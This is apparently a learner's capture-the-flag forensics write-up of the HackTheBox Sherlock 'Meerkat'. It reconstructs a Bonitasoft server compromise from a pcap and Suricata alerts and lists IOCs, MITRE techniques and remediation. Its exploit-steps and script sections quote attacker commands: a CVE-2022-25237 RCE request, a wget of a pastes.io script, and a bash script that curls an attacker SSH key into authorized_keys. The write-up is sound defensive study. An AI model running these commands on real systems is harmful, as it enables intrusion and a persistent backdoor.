# HTB Sherlock Meerkat - Credential stuffing that turned into a backdoor

My first network-based case from HackTheBox Sherlocks. I got a pcap and a Suricata alerts file from a Forela server running Bonitasoft (172.31.6.44) and had to find out if it was compromised. It was. The attacker logged in with stolen credentials, used a Bonita vulnerability to run commands, and left an SSH key to come back later. The main thing I learned here was how to use alerts and the pcap together.

I'm still learning, so I wrote this the way I understood it.

## Links

- https://app.hackthebox.com/sherlocks/Meerkat

## What happened

The attacker ran a script against the Bonita login page with a list of leaked emails and passwords. One account worked (seb.broom). With that account they used CVE-2022-25237 to upload a malicious extension and run commands on the server. Then they downloaded a script from pastes.io that added their SSH key to the server, so they can log in any time without a password. Two IPs were involved, both using `python-requests` as user agent, so it was all automated.

## Step by step

Everything was on 172.31.6.44, 19 Jan 2023 (UTC).

**1. Checking the alerts first**
I used jq to count the alert signatures:

```bash
jq -r '.[] | .alert.signature // empty' meerkat-alerts.json | sort | uniq -c | sort -rn
```

Lots of noise (Dshield, CINS, port scans) but the Bonitasoft alerts stood out - 59 login attempts and several "Authorization Bypass (CVE-2022-25237)". Most of it came from 156.146.62.213 and 138.199.59.221.

**2. The login attempts (15:31)**
In Wireshark I filtered POST requests to the login page:
`http.request.method == "POST" && http.request.uri contains "loginservice"`
118 requests, and every one had a different email and password - 56 unique combos (I didn't count `install:install`, that's the Bonita default and the script tried it before each attempt). Different pairs every time means a leaked list, so this is credential stuffing, not normal brute force.

**3. One login worked (15:35)**
Failed logins got 401, successful ones got 204. I filtered `http.response.code == 204` and found 4 successful logins, all with the same account: `seb.broom@forela.co.uk`.

**4. The exploit (15:35)**
Right after logging in, the attacker sent requests with `;i18ntranslation` at the end of the API path. That's CVE-2022-25237 - Bonita doesn't check permissions on those paths, so a normal user can use the admin API. They uploaded `rce_api_extension.zip` and ran `whoami` through it:
`GET /bonita/API/extension/rce?p=0&c=1&cmd=whoami`

**5. More commands from a second IP (15:38)**
138.199.59.221 logged in with the same account and did the same trick, this time running `cat /etc/passwd`.

**6. Downloading a script (15:38)**
`cmd=wget https://pastes.io/raw/bx5gcr0et8` - the attacker pulled a file from pastes.io onto the server. Paste sites look normal so they don't get blocked.

**7. Running it (15:39)**
`cmd=bash bx5gcr0et8`. After every command the attacker also sent a DELETE for the uploaded page, to clean up.

## What was in the script

The download was over HTTPS so I couldn't see it in the pcap. I opened the paste link instead:

```bash
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```

It downloads the attacker's public key (`hffgra4unv`) and adds it to authorized_keys. So even if the password gets changed, the attacker can still SSH in with their key.

## Wireshark didn't work on my server

I first tried to open the pcap on my Ubuntu server (the one I use for Splunk) and Wireshark crashed with "could not connect to display" - the server has no GUI. So I installed tshark and did the same filters from the terminal. For example, to find the successful logins:

```bash
tshark -r meerkat.pcap -Y 'http.response.code==204' -T fields -e http.request_in
```

Later I opened the pcap in Wireshark on Windows for the screenshots.

## Kill chain

- Credential Access -> credential stuffing on the login page
- Initial Access -> logged in as seb.broom, exploited CVE-2022-25237
- Execution -> commands through the RCE extension
- Command and Control -> script downloaded from pastes.io
- Persistence -> SSH key added to authorized_keys
- Defense Evasion -> deleted the uploaded page after each command

## IOCs

- Attacker IPs: 156.146.62.213, 138.199.59.221
- Compromised account: seb.broom@forela.co.uk
- Uploaded file: rce_api_extension.zip
- Script URL: hxxps://pastes[.]io/raw/bx5gcr0et8
- Key URL: hxxps://pastes[.]io/raw/hffgra4unv
- Modified file: /home/ubuntu/.ssh/authorized_keys
- User agent: python-requests/2.28.1

## MITRE ATT&CK

- T1110.004 - Credential Stuffing
- T1078 - Valid Accounts
- T1190 - Exploit Public-Facing Application
- T1059.004 - Unix Shell
- T1105 - Ingress Tool Transfer
- T1098.004 - SSH Authorized Keys
- T1070 - Indicator Removal

## What I would recommend

- Remove the attacker's key from authorized_keys and check for other changes on the server
- Reset seb.broom's password and the other accounts from the list
- Patch Bonita and disable the default install account
- Add MFA and lock accounts after failed logins
- Block both IPs
- Alert on `i18ntranslation` in web logs

## Screenshots

- screenshots/01-alerts-summary.png - jq output with the top alert signatures
- screenshots/02-credential-stuffing.png - POST requests to loginservice with different credentials
- screenshots/03-successful-login.png - the 204 responses (successful logins)
- screenshots/04-rce-exploit.png - requests with ;i18ntranslation and cmd=
- screenshots/05-wget-pastes.png - the wget command to pastes.io
- screenshots/06-persistence-script.png - the script that adds the SSH key
